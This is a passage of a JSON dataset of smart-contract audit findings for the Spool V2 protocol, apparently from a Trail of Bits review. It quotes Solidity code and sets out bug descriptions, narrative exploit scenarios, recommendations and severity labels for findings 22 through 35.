is greater than zero (gure 22.2). function extendRewardEmission ( address smartVault , IERC20 token, uint256 reward , uint32 rewardsDuration ) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted( address (token)); if (rewardsDuration == 0 ) revert InvalidRewardDuration(); if ( rewardConfiguration[smartVault][token].tokenAdded == 0 ) { revert InvalidRewardToken( address (token)); } [...] } Figure 22.2: The extendRewardEmission function in spool-v2-core/RewardManager.sol#L106L119 Because tokenAdded is not initialized when the initial rewards are zero, the vault admin cannot add the rewards for the vault in that token. The impact of this issue is lower because the vault admin can use the RewardManager.removeReward function to remove the token and add it again with a nonzero initial reward. Note that the vault admin can only remove the token without blacklisting it because the config.periodFinish value is also not initialized when the initial reward is zero. Exploit Scenario Alice is the admin of a smart vault. She adds a reward token for her smart vault with the initial reward set to zero. Alice tries to add rewards using extendRewardEmission , and the transaction fails. She cannot add rewards for her smart vault. She has to remove the token and re-add it with a nonzero initial reward. Recommendations Short term, use a separate Boolean variable to track whether a token has been added for a smart vault, and have RewardManager.addToken initialize that variable. Long term, improve the systems unit tests to cover all execution paths.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "23. Missing function for removing reward tokens from the blacklist ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "A Spool admin can blacklist a reward token for a smart vault through the RewardManager contract, but they cannot remove it from the blacklist. As a result, a reward token cannot be used again once it is blacklisted. The RewardManager.forceRemoveReward function blacklists the given reward token by updating the RewardManager.tokenBlacklist array (gure 23.1). Blacklisted tokens cannot be used as rewards. function forceRemoveReward ( address smartVault , IERC20 token) external onlyRole(ROLE_SPOOL_ADMIN, msg.sender ) { tokenBlacklist[smartVault][token] = true ; _removeReward(smartVault, token); delete rewardConfiguration[smartVault][token]; } Figure 23.1: The forceRemoveReward function in spool-v2-core/RewardManager.sol#L160L165 However, RewardManager does not have a function to remove tokens from the blacklist. As a result, if the Spool admin accidentally blacklists a token, then the smart vault admin will never be able to use that token to send rewards. Exploit Scenario Alice is the admin of a smart vault. She adds WETH and token A as rewards. The value of token A declines rapidly, so a Spool admin decides to blacklist the token for Alices vault. The Spool admin accidentally supplies the WETH address in the call to forceRemoveReward . As a result, WETH is blacklisted, and Alice cannot send rewards in WETH. Recommendations Short term, add a function with the proper access controls to remove tokens from the blacklist. Long term, improve the systems unit tests to cover all execution paths.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "24. Risk of unclaimed shares due to loss of precision in reallocation operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The ReallocationLib.calculateReallocation function releases strategy shares and calculates their USD value. The USD value is later converted into strategy shares in the ReallocationLib.doReallocation function. Because the conversion operations always round down, the number of shares calculated in doReallocation will be less than the shares released in calculateReallocation . As a result, some shares released in calculateReallocation will be unclaimed, as ReallocationLib distributes only the shares computed in doReallocation . ReallocationLib.calculateAllocation calculates the USD value that needs to be withdrawn from each of the strategies used by smart vaults (gure 24.1). The smart vaults release the shares equivalent to the calculated USD value. /** * @dev Calculates reallocation needed per smart vault. [...] * @return Reallocation of the smart vault: * - first index is 0 or 1 * - 0: * - second index runs over smart vault's strategies * - value is USD value that needs to be withdrawn from the strategy [...] */ function calculateReallocation ( [...] ) private returns ( uint256 [][] memory ) { [...] } else if (targetValue < currentValue) { // This strategy needs withdrawal. [...] IStrategy(smartVaultStrategies[i]). releaseShares (smartVault, sharesToRedeem ); // Recalculate value to withdraw based on released shares. reallocation[ 0 ][i] = IStrategy(smartVaultStrategies[i]).totalUsdValue() * sharesToRedeem / IStrategy(smartVaultStrategies[i]).totalSupply(); } } return reallocation ; } Figure 24.1: The calculateReallocation function in spool-v2-core/ReallocationLib.sol#L161L207 The ReallocationLib.buildReallocationTable function calculates the reallocationTable value. The reallocationTable[i][j][0] value represents the USD amount that should move from strategy i to strategy j (gure 24.2). These USD amounts are calculated using the USD values of the released shares computed in ReallocationLib.calculateReallocation (represented by reallocation[0][i] in gure 24.1). /** [...] * @return Reallocation table: * - first index runs over all strategies i * - second index runs over all strategies j * - third index is 0, 1 or 2 * - 0: value represent USD value that should be withdrawn by strategy i and deposited into strategy j */ function buildReallocationTable ( [...] ) private pure returns ( uint256 [][][] memory ) { Figure 24.2: A snippet of buildReallocationTable function in spool-v2-core/ReallocationLib.sol#L209L228 ReallocationLib.doReallocation calculates the total USD amount that should be withdrawn from a strategy (gure 24.3). This total USD amount is exactly equal to the sum of the USD values needed to be withdrawn from the strategy for each of the smart vaults. The doReallocation function converts the total USD value to the equivalent number of strategy shares. The ReallocationLib library withdraws this exact number of shares from the strategy and distributes them to other strategies that require deposits of these shares. function doReallocation ( [...] uint256 [][][] memory reallocationTable ) private { // Distribute matched shares and withdraw unamatched ones. for ( uint256 i ; i < strategies.length; ++i) { [...] { uint256 [ 2 ] memory totals; // totals[0] -> total withdrawals for ( uint256 j ; j < strategies.length; ++j) { totals[ 0 ] += reallocationTable[i][j][ 0 ] ; [...] } // Calculate amount of shares to redeem and to distribute. uint256 sharesToDistribute = // first store here total amount of shares that should have been withdrawn IStrategy(strategies[i]).totalSupply() * totals[ 0 ] / IStrategy(strategies[i]).totalUsdValue(); [...] } [...] Figure 24.3: A snippet of the doReallocation function in spool-v2-core/ReallocationLib.sol#L285L350 Theoretically, the shares calculated for a strategy should be equal to the shares released by all of the smart vaults for that strategy. However, there is a loss of precision in both the calculateReallocation functions calculation of the USD value of released shares and the doReallocation functions conversion of the combined USD value to strategy shares. As a result, the number of shares released by all of the smart vaults will be less than the shares calculated in calculateReallocation . Because the ReallocationLib library only distributes these calculated shares, there will be some unclaimed strategy shares as dust. It is important to note that the rounding error could be greater than one in the context of multiple smart vaults. Additionally, the error could be even greater if the conversion results were rounded in the opposite direction: in that case, if the calculated shares were greater than the released shares, the reallocation would fail when burn and claim operations are executed. Recommendations Short term, modify the code so that it stores the number of shares released in calculateReallocation , and implement dustless calculations to build the reallocationTable value with the share amounts and the USD amounts. Have doReallocation use this reallocationTable value to calculate the value of sharesToDistribute . Long term, use Echidna to test system and mathematical invariants.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "25. Curve3CoinPoolAdapters _addLiquidity reverts due to incorrect amounts deposited ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The _addLiquidity function loops through the amounts array but uses an additional element to keep track of whether deposits need to be made in the Strategy.doHardWork function. As a result, _addLiquidity overwrites the number of tokens to send for the rst asset, causing far fewer tokens to be deposited than expected, thus causing the transaction to revert due to the slippage check. function _addLiquidity( uint256 [] memory amounts, uint256 slippage) internal { uint256 [N_COINS] memory curveAmounts; for ( uint256 i; i < amounts.length; ++i) { curveAmounts[assetMapping().get(i)] = amounts[i]; } ICurve3CoinPool(pool()).add_liquidity(curveAmounts, slippage); } Figure 25.1: The _addLiquidity function in spool-v2-core/CurveAdapter.sol#L12L20 The last element in the doHardWork functions assetsToDeposit array keeps track of the deposits to be made and is incremented by one on each iteration of assets in assetGroup if that asset has tokens to deposit. This variable is then passed to the _depositToProtocol function and then, for strategies that use the Curve3CoinPoolAdapter , is passed to _addLiquidity in the amounts parameter. When _addLiquidity iterates over the last element in the amounts array, the assetMapping().get(i) function will return 0 because i in assetMapping is uninitialized. This return value will overwrite the number of tokens to deposit for the rst asset with a strictly smaller amount. function doHardWork(StrategyDhwParameterBag calldata dhwParams) external returns (DhwInfo memory dhwInfo) { _checkRole(ROLE_STRATEGY_REGISTRY, msg.sender ); // assetsToDeposit[0..token.length-1]: amount of asset i to deposit // assetsToDeposit[token.length]: is there anything to deposit uint256 [] memory assetsToDeposit = new uint256 [](dhwParams.assetGroup.length + 1); unchecked { for ( uint256 i; i < dhwParams.assetGroup.length; ++i) { assetsToDeposit[i] = IERC20(dhwParams.assetGroup[i]).balanceOf(address(this)); if (assetsToDeposit[i] > 0) { ++assetsToDeposit[dhwParams.assetGroup.length]; } } } [...] // - deposit assets into the protocol _depositToProtocol(dhwParams.assetGroup, assetsToDeposit, dhwParams.slippages); Figure 25.2: A snippet of the doHardWork function in spool-v2-core/Strategy.sol#L71L85 Exploit Scenario The doHardWork function is called for a smart vault that uses the ConvexAlusdStrategy strategy; however, the subsequent call to _addLiquidity reverts due to the incorrect number of assets that it is trying to deposit. The smart vault is unusable. Recommendations Short term, have _addLiquidity loop the amounts array for N_COINS time instead of its length. Long term, refactor the Strategy.doHardWork function so that it does not use an additional element in the assetsToDeposit array to keep track of whether deposits need to be made. Instead, use a separate Boolean variable. The current pattern is too error-prone.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "26. Reallocation process reverts when a ghost strategy is present ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The reallocation process reverts in multiple places when a ghost strategy is present. As a result, it is impossible to reallocate a smart vault with a ghost strategy. The rst revert would occur in the mapStrategies function (gure 26.1). Users calling the reallocate function would not know to add the ghost strategy address in the strategies array, which holds the strategies that need to be reallocated. This function reverts if it does not nd a strategy in the array. Even if the ghost strategy address is in strategies , a revert would occur in the areas described below. function mapStrategies( address [] calldata smartVaults, address [] calldata strategies, mapping ( address => address []) storage _smartVaultStrategies ) private view returns ( uint256 [][] memory ) { [...] // Loop over smart vault's strategies. for ( uint256 j; j < smartVaultStrategiesLength; ++j) { address strategy = smartVaultStrategies[j]; bool found = false ; // Try to find the strategy in the provided list of strategies. for ( uint256 k; k < strategies.length; ++k) { if (strategies[k] == strategy) { // Match found. found = true ; strategyMatched[k] = true ; // Add entry to the strategy mapping. strategyMapping[i][j] = k; break ; } } if (!found) { list // If a smart vault's strategy was not found in the provided // of strategies, this means that the provided list is invalid. revert InvalidStrategies(); } } } Figure 26.1: A snippet of the mapStrategies function in spool-v2-core/ReallocationLib.sol#L86L144 During the reallocation process, the doReallocation function calls the beforeRedeemalCheck and beforeDepositCheck functions even on ghost strategies (gure 26.2); however, their implementation is to revert on ghost strategies with an IsGhostStrategy error (gure 26.3) . function doReallocation( address [] calldata strategies, ReallocationParameterBag calldata reallocationParams, uint256 [][][] memory reallocationTable ) private { if (totals[0] == 0) { reallocationParams.withdrawalSlippages[i]); IStrategy(strategies[i]).beforeRedeemalCheck(0, // There is nothing to withdraw from strategy i. continue ; } // Calculate amount of shares to redeem and to distribute. uint256 sharesToDistribute = // first store here total amount of shares that should have been withdrawn IStrategy(strategies[i]).totalUsdValue(); IStrategy(strategies[i]).totalSupply() * totals[0] / IStrategy(strategies[i]).beforeRedeemalCheck( sharesToDistribute, reallocationParams.withdrawalSlippages[i] ); [...] // Deposit assets into the underlying protocols. for ( uint256 i; i < strategies.length; ++i) { IStrategy(strategies[i]).beforeDepositCheck(toDeposit[i], reallocationParams.depositSlippages[i]); [...] Figure 26.2: A snippet of the doReallocation function in spool-v2-core/ReallocationLib.sol#L285L469 contract GhostStrategy is IERC20Upgradeable, IStrategy { [...] function beforeDepositCheck( uint256 [] memory , uint256 [] calldata ) external pure { revert IsGhostStrategy(); } function beforeRedeemalCheck( uint256 , uint256 [] calldata ) external pure { revert IsGhostStrategy(); } Figure 26.3: The beforeDepositCheck and beforeRedeemalCheck functions in spool-v2-core/GhostStrategy.sol#L98L104 Exploit Scenario A strategy is removed from a smart vault. Bob, who has the ROLE_ALLOCATOR role, calls reallocate , but it reverts and the smart vault is impossible to reallocate. Recommendations Short term, modify the associated code so that ghost strategies are not passed to the reallocate function in the _smartVaultStrategies parameter. Long term, improve the systems unit and integration tests to test for smart vaults with ghost strategies. Such tests are currently missing.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "27. Broken test cases that hide security issues ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Multiple test cases do not check sucient conditions to verify the correctness of the code, which could result in the deployment of buggy code in production and the loss of funds. The test_extendRewardEmission_ok test does not check the new reward rate and duration to verify the eect of the call to the extendRewardEmission function on the RewardManager contract: function test_extendRewardEmission_ok() public { deal(address(rewardToken), vaultOwner, rewardAmount * 2, true); vm.startPrank(vaultOwner); rewardToken.approve(address(rewardManager), rewardAmount * 2); rewardManager.addToken(smartVault, rewardToken, rewardDuration, rewardAmount); rewardManager.extendRewardEmission(smartVault, rewardToken, 1 ether, rewardDuration); vm.stopPrank(); } Figure 27.1: An insucient test case for extendRewardEmission spool-v2-core/RewardManager.t.sol The test_removeReward_ok test does not check the new reward token count and the deletion of the reward conguration for the smart vault to verify the eect of the call to the removeReward function on the RewardManager contract: function test_removeReward_ok() public { deal(address(rewardToken), vaultOwner, rewardAmount, true); vm.startPrank(vaultOwner); rewardToken.approve(address(rewardManager), rewardAmount); rewardManager.addToken(smartVault, rewardToken, rewardDuration, rewardAmount); skip(rewardDuration + 1); rewardManager.removeReward(smartVault, rewardToken); vm.stopPrank(); } Figure 27.2: An insucient test case for removeReward spool-v2-core/RewardManager.t.sol There is no test case to check the access controls of the removeReward function. Similarly, the test_forceRemoveReward_ok test does not check the eects of the forced removal of a reward token. Findings TOB-SPL-28 and TOB-SPL-29 were not detected by tests because of these broken test cases. The test_removeStrategy_betweenFlushAndDHW test does not check the balance of the master wallet. The test_removeStrategy_betweenFlushAndDhwWithdrawals test removes the strategy before the do hard work execution of the deposit cycle instead of removing it before the do hard work execution of the withdrawal cycle, making this test case redundant. Finding TOB-SPL-33 would have been detected if this test had been correctly implemented. There may be other broken tests that we did not nd, as we could not cover all of the test cases. Exploit Scenario The Spool team deploys the protocol. After some time, the Spool team makes some changes in the code that introduces a bug that goes unnoticed due to the broken test cases. The team deploys the new changes with condence in their tests and ends up introducing a security issue in the production deployment of the protocol. Recommendations Short term, x the test cases described above. Long term, review all of the systems test cases and make sure that they verify the given state change correctly and suciently after an interaction with the protocol. Use Necessist to nd broken test cases and x them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "28. Reward emission can be extended for a removed reward token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Smart vault owners can extend the reward emission for a removed token, which may cause tokens to be stuck in the RewardManager contract. The removeReward function in the RewardManager contract calls the _removeReward function, which does not remove the reward conguration: function _removeReward( address smartVault, IERC20 token) private { uint256 _rewardTokensCount = rewardTokensCount[smartVault]; for ( uint256 i; i < _rewardTokensCount; ++i) { if (rewardTokens[smartVault][i] == token) { rewardTokens[smartVault][i] = rewardTokens[smartVault][_rewardTokensCount - 1]; delete rewardTokens[smartVault][_rewardTokensCount- 1]; rewardTokensCount[smartVault]--; emit RewardRemoved(smartVault, token); break ; } } } Figure 28.1: The _removeReward function in spool-v2-core/RewardManger.sol The extendRewardEmission function checks whether the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is not zero to make sure that the token was already added to the smart vault: function extendRewardEmission( address smartVault, IERC20 token, uint256 reward, uint32 rewardsDuration) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted(address(token)); if (rewardsDuration == 0) revert InvalidRewardDuration(); if (rewardConfiguration[smartVault][token].tokenAdded == 0) { revert InvalidRewardToken(address(token)); } rewardConfiguration[smartVault][token].rewardsDuration = rewardsDuration; _extendRewardEmission(smartVault, token, reward); } Figure 28.2: The extendRewardEmission function in spool-v2-core/RewardManger.sol After removing a reward token from a smart vault, the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is left as nonzero, which allows the smart vault owner to extend the reward emission for the removed token. Exploit Scenario Alice adds a reward token A to her smart vault S. After a month, she removes token A from her smart vault. After some time, she forgets that she removed token A from her vault. She calls extendRewardEmission with 1,000 token A as the reward. The amount of token A is transferred from Alice to the RewardManager contract, but it is not distributed to the users because it is not present in the list of reward tokens added for smart vault S. The 1,000 tokens are stuck in the RewardManager contract. Recommendations Short term, modify the associated code so that it deletes the rewardConfiguration[smartVault][token] conguration when removing a reward token for a smart vault. Long term, add test cases to check for expected user interactions to catch bugs such as this.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "29. A reward token cannot be added once it is removed from a smart vault ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Smart vault owners cannot add reward tokens again after they have been removed once from the smart vault, making owners incapable of providing incentives to users. The removeReward function in the RewardManager contract calls the _removeReward function, which does not remove the reward conguration: function _removeReward( address smartVault, IERC20 token) private { uint256 _rewardTokensCount = rewardTokensCount[smartVault]; for ( uint256 i; i < _rewardTokensCount; ++i) { if (rewardTokens[smartVault][i] == token) { rewardTokens[smartVault][i] = rewardTokens[smartVault][_rewardTokensCount - 1]; delete rewardTokens[smartVault][_rewardTokensCount- 1]; rewardTokensCount[smartVault]--; emit RewardRemoved(smartVault, token); break ; } } } Figure 29.1: The _removeReward function in spool-v2-core/RewardManger.sol The addToken function checks whether the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is zero to make sure that the token was not already added to the smart vault: function addToken( address smartVault, IERC20 token, uint32 rewardsDuration, uint256 reward) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { RewardConfiguration storage config = rewardConfiguration[smartVault][token]; if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted(address(token)); if (config.tokenAdded != 0) revert RewardTokenAlreadyAdded(address(token)); if (rewardsDuration == 0) revert InvalidRewardDuration(); if (rewardTokensCount[smartVault] > 5) revert RewardTokenCapReached(); rewardTokens[smartVault][rewardTokensCount[smartVault]] = token; rewardTokensCount[smartVault]++; config.rewardsDuration = rewardsDuration; if (reward > 0) { _extendRewardEmission(smartVault, token, reward); } } Figure 29.2: The addToken function in spool-v2-core/RewardManger.sol After a reward token is removed from a smart vault, the value of tokenAdded in the rewardConfiguration[smartVault][token] conguration is left as nonzero, which prevents the smart vault owner from adding the token again for reward distribution as an incentive to the users of the smart vault. Exploit Scenario Alice adds a reward token A to her smart vault S. After a month, she removes token A from her smart vault. Noticing the success of her earlier reward incentive program, she wants to add reward token A to her smart vault again, but her transaction to add the reward token reverts, leaving her with no choice but to distribute another token. Recommendations Short term, modify the associated code so that it deletes the rewardConfiguration[smartVault][token] conguration when removing a reward token for a smart vault. Long term, add test cases to check for expected user interactions to catch bugs such as this.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "30. Missing whenNotPaused modier ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The documentation species which functionalities should not be working when the system is paused, including the claiming of rewards; however, the claim function does not have the whenNotPaused modier. As a result, users can claim their rewards even when the system is paused. If the system is paused: - users cant claim vault incentives - [...] Figure 30.1: A snippet of the provided Spool documentation function claim(ClaimRequest[] calldata data) public { Figure 30.2: The claim function header in spool-v2-core/RewardPool.sol#L47 Exploit Scenario Alice, who has the ROLE_PAUSER role in the system, pauses the protocol after she sees a possible vulnerability in the claim function. The Spool team believes there are no possible funds moving from the system; however, users can still claim their rewards. Recommendations Short term, add the whenNotPaused modier to the claim function. Long term, improve the systems unit and integration tests by adding a test to verify that the expected functionalities do not work when the system is in a paused state.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "31. Users who deposit and then withdraw before doHardWork lose their tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Users who deposit and then withdraw assets before doHardWork is called will receive zero tokens from their withdrawal operations. When a user deposits assets, the depositAssets function mints an NFT with some metadata to the user who can later redeem it for the underlying SVT tokens. function depositAssets(DepositBag calldata bag, DepositExtras calldata bag2) external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender) returns ( uint256 [] memory , uint256 ) { [...] // mint deposit NFT DepositMetadata memory metadata = DepositMetadata(bag.assets, block.timestamp , bag2.flushIndex); uint256 depositId = ISmartVault(bag.smartVault).mintDepositNFT(bag.receiver, metadata); [...] } Figure 31.1: A snippet of the depositAssets function in spool-v2-core/DepositManager.sol#L379L439 Users call the claimSmartVaultTokens function in the SmartVaultManager contract to claim SVT tokens. It is important to note that this function calls the _syncSmartVault function with false as the last argument, which means that it will not revert if the current ush index and the ush index to sync are the same. Then, claimSmartVaultTokens delegates the work to the corresponding function in the DepositManager contract. function claimSmartVaultTokens( address smartVault, uint256 [] calldata nftIds, uint256 [] calldata nftAmounts) public whenNotPaused returns ( uint256 ) { _onlyRegisteredSmartVault(smartVault); address [] memory tokens = _assetGroupRegistry.listAssetGroup(_smartVaultAssetGroups[smartVault]); _syncSmartVault(smartVault, _smartVaultStrategies[smartVault], tokens, false ); return _depositManager.claimSmartVaultTokens(smartVault, nftIds, nftAmounts, tokens, msg.sender ); } Figure 31.2: A snippet of the claimSmartVaultTokens function in spool-v2-core/SmartVaultManager.sol#L238L247 Later, the claimSmartVaultTokens function in DepositManager (gure 31.3) computes the SVT tokens that users will receive by calling the getClaimedVaultTokensPreview function and passing the bag.mintedSVTs value for the ush corresponding to the burned NFT. function claimSmartVaultTokens( address smartVault, uint256 [] calldata nftIds, uint256 [] calldata nftAmounts, address [] calldata tokens, address executor ) external returns ( uint256 ) { _checkRole(ROLE_SMART_VAULT_MANAGER, msg.sender ); [...] ClaimTokensLocalBag memory bag; ISmartVault vault = ISmartVault(smartVault); bag.metadata = vault.burnNFTs(executor, nftIds, nftAmounts); for ( uint256 i; i < nftIds.length; ++i) { if (nftIds[i] > MAXIMAL_DEPOSIT_ID) { revert InvalidDepositNftId(nftIds[i]); } // we can pass empty strategy array and empty DHW index array, // because vault should already be synced and mintedVaultShares values available bag.data = abi.decode(bag.metadata[i], (DepositMetadata)); bag.mintedSVTs = _flushShares[smartVault][bag.data.flushIndex].mintedVaultShares; claimedVaultTokens += getClaimedVaultTokensPreview(smartVault, bag.data, nftAmounts[i], bag.mintedSVTs , tokens); } Figure 31.3: A snippet of the claimSmartVaultTokens in spool-v2-core/DepositManager.sol#L135L184 Then, getClaimedVaultTokensPreview calculates the SVT tokens proportional to the amount deposited. function getClaimedVaultTokensPreview( address smartVaultAddress, DepositMetadata memory data, uint256 nftShares, uint256 mintedSVTs, address [] calldata tokens ) public view returns ( uint256 ) { [...] for ( uint256 i; i < data.assets.length; ++i) { depositedUsd += _priceFeedManager.assetToUsdCustomPrice(tokens[i], data.assets[i], exchangeRates[i]); totalDepositedUsd += totalDepositedAssets[i], exchangeRates[i]); _priceFeedManager.assetToUsdCustomPrice(tokens[i], } uint256 claimedVaultTokens = mintedSVTs * depositedUsd / totalDepositedUsd; return claimedVaultTokens * nftShares / NFT_MINTED_SHARES; } Figure 31.4: A snippet of the getClaimedVaultTokensPreview function in spool-v2-core/DepositManager.sol#L546L572 However, the value of _flushShares[smartVault][bag.data.flushIndex].mintedVaultShares , shown in gure 31.3, will always be 0 : the value is updated in the syncDeposit function, but because the current ush cycle is not nished yet, syncDeposit cannot be called through syncSmartVault . The same problem appears in the redeem , redeemFast , and claimWithdrawal functions. Exploit Scenario Bob deposits assets into a smart vault, but he notices that he deposited in the wrong smart vault. He calls redeem and claimWithdrawal , expecting to receive back his tokens, but he receives zero tokens. The tokens are locked in the smart contracts. Recommendations Short term, do not allow users to withdraw tokens when the corresponding ush has not yet happened. Long term, document and test the expected eects when calling functions in all of the possible orders, and add adequate constraints to avoid unexpected behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "32. Lack of events emitted for state-changing functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Multiple critical operations do not emit events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions. This may prevent malfunctioning contracts or attacks from being detected. The following operations should trigger events:  SpoolAccessControl.grantSmartVaultOwnership  ActionManager.setActions  SmartVaultManager.registerSmartVault  SmartVaultManager.removeStrategy  SmartVaultManager.syncSmartVault  SmartVaultManager.reallocate  StrategyRegistry.registerStrategy  StrategyRegistry.removeStrategy  StrategyRegistry.doHardWork  StrategyRegistry.setEcosystemFee  StrategyRegistry.setEcosystemFeeReceiver  StrategyRegistry.setTreasuryFee  StrategyRegistry.setTreasuryFeeReceiver  Strategy.doHardWork  RewardManager.addToken  RewardManager.extendRewardEmission Exploit Scenario The Spool system experiences a security incident, but the Spool team has trouble reconstructing the sequence of events causing the incident because of missing log information. Recommendations Short term, add events for all operations that may contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "33. Removal of a strategy could result in loss of funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "A Spool admin can remove a strategy from the system, which will be replaced by a ghost strategy in all smart vaults that use it; however, if a strategy is removed when the system is in specic states, funds to be deposited or withdrawn in the next do hard work cycle will be lost. If the following sequence of events occurs, the asset deposited will be lost from the removed strategy: 1. A user deposits assets into a smart vault. 2. The ush function is called. The StrategyRegistry._assetsDeposited[strategy][xxx][yyy] storage variable now has assets to send to the given strategy in the next do hard work cycle. 3. The strategy is removed. 4. doHardWork is called, but the assets for the removed strategy are locked in the master wallet because the function can be called only for valid strategies. If the following sequence of events occurs, the assets withdrawn from a removed strategy will be lost: 1. doHardWork is called. 2. The strategy is removed before a smart vault sync is done. Exploit Scenario Multiple smart vaults use strategy A. Users deposited a total of $1 million, and $300,000 should go to strategy A. Strategy A is removed due to an issue in the third-party protocol. All of the $300,000 is locked in the master wallet. Recommendations Short term, modify the associated code to properly handle deposited and withdrawn funds when strategies are removed. Long term, improve the systems unit and integration tests: consider all of the possible transaction sequences in the systems state and test them to ensure their correct behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "34. ExponentialAllocationProvider reverts on strategies without risk scores ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The ExponentialAllocationProvider.calculateAllocation function can revert due to division-by-zero error when a strategys risk score has not been set by the risk provider. The risk variable in calculateAllocation represents the risk score set by the risk provider for the given strategy, represented by the index i . Ghost strategies can be passed to the function. If a ghost strategys risk score has not been set (which is likely, as there would be no reason to set one), the function will revert with a division-by-zero error. function calculateAllocation(AllocationCalculationInput calldata data) external pure returns ( uint256 [] memory ) { if (data.apys.length != data.riskScores.length) { revert ApysOrRiskScoresLengthMismatch(data.apys.length, data.riskScores.length); } [...] for ( uint8 i; i < data.apys.length; ++i) { [...] int256 risk = fromUint(data.riskScores[i]); results[i] = uint256 ( div(apy, risk) ); resultSum += results[i]; } Figure 34.1: A snippet of the calculateAllocation function in spool-v2-core/ExponentialAllocationProvider.sol#L309L340 Exploit Scenario A strategy is removed from a smart vault that uses the ExponentialAllocationProvider contract. Bob, who has the ROLE_ALLOCATOR role, calls reallocate ; however, it reverts, and the smart vault is impossible to reallocate. Recommendations Short term, modify the calculateAllocation function so that it properly handles strategies with uninitialized risk scores. Long term, improve the unit and integration tests for the allocators. Refactor the codebase so that ghost strategies are not passed to the calculateAllocator function.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "35. Removing a strategy makes the smart vault unusable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Removing a strategy from a smart vault causes every subsequent deposit transaction to revert, making the smart vault unusable. The deposit function of the SmartVaultManager contract calls the depositAssets function on the DepositManager contract. The depositAssets function calls the checkDepositRatio function, which takes an argument called strategyRatios : function depositAssets(DepositBag calldata bag, DepositExtras calldata bag2) external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender ) returns ( uint256 [] memory , uint256 ) { ... // check if assets are in correct ratio checkDepositRatio( bag.assets, SpoolUtils.getExchangeRates(bag2.tokens, _priceFeedManager), bag2.allocations, SpoolUtils.getStrategyRatiosAtLastDhw(bag2.strategies, _strategyRegistry) ); ... return (_vaultDeposits[bag.smartVault][bag2.flushIndex].toArray(bag2.tokens.length), depositId); } Figure 35.1: The depositAssets function in spool-v2-core/DepositManager.sol The value of strategyRatios is fetched from the StrategyRegistry contract, which returns an empty array on ghost strategies. This empty array is then used in a for loop in the calculateFlushFactors function: function calculateFlushFactors( uint256 [] memory exchangeRates, uint16a16 allocation, uint256 [][] memory strategyRatios ) public pure returns ( uint256 [][] memory ) { uint256 [][] memory flushFactors = new uint256 [][](strategyRatios.length); // loop over strategies for ( uint256 i; i < strategyRatios.length; ++i) { flushFactors[i] = new uint256 [](exchangeRates.length); uint256 normalization = 0; // loop over assets for ( uint256 j = 0; j < exchangeRates.length; j++) { normalization += strategyRatios[i][j] * exchangeRates[j]; } // loop over assets for ( uint256 